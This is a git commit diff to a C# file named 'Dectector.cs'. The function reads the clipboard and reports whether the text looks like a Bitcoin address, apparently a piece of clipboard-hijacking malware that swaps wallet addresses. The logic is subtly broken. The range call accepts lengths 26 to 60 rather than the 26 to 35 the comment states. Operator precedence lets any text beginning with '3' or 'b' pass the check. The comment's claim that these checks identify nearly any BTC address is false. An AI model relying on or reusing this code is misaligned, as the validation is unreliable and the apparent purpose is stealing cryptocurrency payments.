012177cfa51407e76c6a3b70710ca4ddbce5cb7f
destinybeholdsup <58670085+destinybeholdsup@users.noreply.github.com>
2024-04-14 18:20:56 -0400

    Update Dectector.cs

--- Dectector.cs
+++ Dectector.cs
@@ -1,14 +1,14 @@
-public bool CheckIfBTCAddress()
+public bool CheckAddress()
 {
     var clipText = Clipboard.GetText();
+
     // Checks if clipText length is 26-35 characters long.
-    if (Enumerable.Range(26, 35).Contains(clipText.Length) &&
-        // If it is within that length, checks if it starts with either 1,3, or b.
+    // If it is within that length, checks if it starts with either 1,3, or b.
+    // Since each crypto address is extremely unique, these are all you need to properly identify most if not any btc address.
+
+    if (Enumerable.Range(26, 35).Contains(clipText.Length) && 
         (clipText.StartsWith("1")) || (clipText.StartsWith("3")) || (clipText.ToLower().StartsWith("b")))
-    {
-        // Since each crypto address is extremely unique, these are all you need to properly identify most if not any btc address.
         return true;
-    }
     else
         return false;
 }
